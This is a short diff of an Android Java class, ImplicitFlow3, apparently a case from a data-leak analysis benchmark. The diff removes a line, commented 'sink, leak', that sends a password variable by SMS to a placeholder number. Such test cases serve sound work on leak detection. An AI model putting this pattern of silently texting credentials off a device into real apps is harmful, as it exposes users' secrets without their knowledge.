@@ -68,8 +68,7 @@ public class ImplicitFlow3 extends Activity {
   			Log.i("INFO", "0"); //sink
   		else if(list instanceof LinkedList)
   			Log.i("INFO", "1"); //sink
-		SmsManager sms = SmsManager.getDefault();
-		sms.sendTextMessage("+49 1234", null, pass, null, null); //sink, leak
+
 	}
   	
   	interface Interface{
